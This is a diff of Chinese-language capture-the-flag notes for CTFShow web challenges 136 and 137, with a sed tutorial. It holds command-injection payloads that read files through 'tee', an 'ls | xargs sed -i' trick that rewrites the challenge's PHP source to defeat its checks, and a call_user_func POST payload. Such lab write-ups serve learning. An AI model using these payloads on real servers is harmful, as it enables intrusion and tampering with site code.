@@ -183,12 +183,13 @@ if($key1 == '36d' && $key2 == '36d') {
 ## 136
 ![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783655341285_image.png)
 
-一个正则过滤，一个无回显的命令执行
+1.一个正则过滤，一个无回显的命令执行
 使用`tee`命令，可以变为另一个文件，类似`>`
 
 `?c=ls /|tee 1` 访问1下载查看， `?c=cat /f149_15_h3r3|tee 2 `访问下载查看文件2
 
-还有一个更骚的操作
+
+2.还有一个更骚的操作
 ``ls | xargs sed -i 's/die/echo/'``和``ls | xargs sed -i 's/exec/system/'``
 ```
 ls：列出当前目录文件
@@ -198,6 +199,7 @@ sed -i 's/die/echo/'：直接在文件里把 die 替换成 echo
 ```
 如果存在命令执行，且 sed -i 可用、源码可写、过滤没拦关键字符，那就很可能能“改题目源码”
 
+----
 `sed` 可以理解成一个“命令行文本编辑器”。它最常见的用途就是：**查找、替换、删除、打印文本**。
 
 基本格式：
@@ -216,9 +218,7 @@ sed 's/旧内容/新内容/' file.txt
 
 比如：
 
-```bash
-sed 's/apple/banana/' a.txt
-```
+`sed 's/apple/banana/' a.txt`
 
 意思是：把每一行里第一次出现的 `apple` 替换成 `banana`，然后把结果输出到屏幕。
 
@@ -226,37 +226,22 @@ sed 's/apple/banana/' a.txt
 
 如果想直接改文件，要加 `-i`：
 
-```bash
-sed -i 's/apple/banana/' a.txt
-```
+`sed -i 's/apple/banana/' a.txt`这就是能“改题目”的关键：
 
-这就是能“改题目”的关键：
-
-```bash
-sed -i 's/die/echo/' index.php
-```
-
+`sed -i 's/die/echo/' index.php`
 意思是：直接在 `index.php` 里，把第一次匹配到的 `die` 替换成 `echo`。
 
-如果想一行里所有匹配都替换，加 `g`：
+如果想一行里所有匹配都替换，加 `g`：`sed -i 's/apple/banana/g' a.txt`
+。`g` 是 global，表示全局替换。
 
-```bash
-sed -i 's/apple/banana/g' a.txt
-```
-
-`g` 是 global，表示全局替换。
 
 还可以换分隔符。比如路径里很多 `/`，这样写很烦：
 
-```bash
-sed -i 's/\/var\/www\/html/\/tmp/g' a.txt
-```
+`sed -i 's/\/var\/www\/html/\/tmp/g' a.txt`
 
 可以改成：
 
-```bash
-sed -i 's#/var/www/html#/tmp#g' a.txt
-```
+`sed -i 's#/var/www/html#/tmp#g' a.txt`
 
 `sed` 不强制用 `/` 当分隔符，`#`、`@` 都可以。
 
@@ -293,4 +278,30 @@ sed -i 's#/var/www/html#/tmp#g' a.txt
 ## 137
 ![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1783660917916_image.png)
 
+两个类，魔术类静态类
 
+[call_user_func](https://www.php.net/manual/zh/function.call-user-func.php)
+是 PHP 里的“动态调用函数”
+
+基本格式是：call_user_func(要调用的函数或方法, 参数1, 参数2, ...)
+
+支持几种常见调用方式：
+`call_user_func("phpinfo");`
+调用普通函数：
+`phpinfo();`
+
+调用类的静态方法：
+`call_user_func("类名::方法名");`
+例如
+`call_user_func("ctfshow::getFlag");`
+
+------
+`__wakeup() `是反序列化魔术方法，通常在：
+`unserialize($data);`
+时自动触发。
+
+
+
+-------
+
+POST:ctfshow=ctfshow::getFlag
